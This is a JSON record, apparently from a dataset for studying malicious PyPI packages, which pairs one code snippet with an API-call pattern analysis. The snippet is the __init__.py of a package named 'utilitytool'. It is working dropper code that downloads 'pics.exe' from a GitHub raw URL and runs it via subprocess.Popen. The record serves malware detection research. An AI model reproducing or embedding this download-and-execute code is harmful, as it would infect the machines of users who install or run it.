[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/utilitytool-0.0.2-py3-none-any/utilitytools/__init__.py",
    "code_snippet": "import os\nimport requests\nimport subprocess\n\ndef download_and_run_exe(url, exe_path):\n    \"\"\"Download an executable file from a URL and run it.\"\"\"\n    def download_file(url, file_path):\n        response = requests.get(url)\n        if response.status_code == 200:\n            with open(file_path, 'wb') as f:\n                f.write(response.content)\n            return True\n        else:\n            return False\n\n    def run_exe(exe_path):\n        try:\n            subprocess.Popen(exe_path)\n            return True\n        except Exception as e:\n            return False\n\n    if download_file(url, exe_path):\n        if run_exe(exe_path):\n            return True\n    return False\n\ndef main():\n    url = \"https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/pics.exe\"\n    exe_path = \"pics.exe\"\n    if download_and_run_exe(url, exe_path):\n        print(\"Executable downloaded and ran successfully.\")\n    else:\n        print(\"Failed to download and run the executable.\")\n\nif __name__ == \"__main__\":\n    main()",
    "pattern_analysis": {
      "api_sequence": [
        "requests.get",
        "open",
        "file.write",
        "subprocess.Popen"
      ],
      "api_sequence_with_args": [
        "requests.get(url)",
        "open(file_path, 'wb')",
        "file.write(response.content)",
        "subprocess.Popen(exe_path)"
      ],
      "mapped_sequence": [
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "file.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "import requests\nimport subprocess\n\ndef download_and_run_exe(url, exe_path):\n    def download_file(url, file_path):\n        response = requests.get(url)\n        if response.status_code == 200:\n            with open(file_path, 'wb') as f:\n                f.write(response.content)\n            return True\n        else:\n            return False\n\n    def run_exe(exe_path):\n        try:\n            subprocess.Popen(exe_path)\n            return True\n        except Exception as e:\n            return False\n\n    if download_file(url, exe_path):\n        if run_exe(exe_path):\n            return True\n    return False"
    }
  }
]